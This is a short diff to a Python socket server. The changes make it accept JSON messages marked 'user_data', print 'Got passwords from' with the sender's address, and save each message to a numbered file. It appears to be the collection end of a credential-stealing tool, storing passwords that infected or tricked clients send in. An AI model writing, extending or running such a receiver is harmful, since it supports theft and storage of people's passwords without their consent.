@@ -1,13 +1,17 @@
 # first of all import the socket library
 import socket
+import json
 
+num = 0
+BUFFER_LEN = 33554432
+port = 65432
 # next create a socket object
 s = socket.socket()
 print("Socket successfully created")
 
 # reserve a port on your computer in our
 # case it is 12345 but it can be anything
-port = 65432
+
 
 # Next bind to the port
 # we have not typed any ip in the ip field
@@ -26,8 +30,22 @@ print("socket is listening")
 while True:
     # Establish connection with client.
     c, addr = s.accept()
-    print('Got connection from', addr)
-    print(c.recv(33554432).decode())
+
+    recvMe = c.recv(BUFFER_LEN).decode()
+    jsonMe = json.loads(recvMe)
+
+    if jsonMe.__contains__("type") == True and jsonMe.__contains__("ipv6") == True:
+        if jsonMe["type"] == "user_data":
+
+            name = str(num)+".json"
+            num = num + 1
+
+            print('Got passwords from', addr)
+
+            with open(name, "w") as outfile:
+                outfile.write(json.dumps(jsonMe, indent=4))
+                outfile.close()
+
 
     # Close the connection with the client
     c.close()
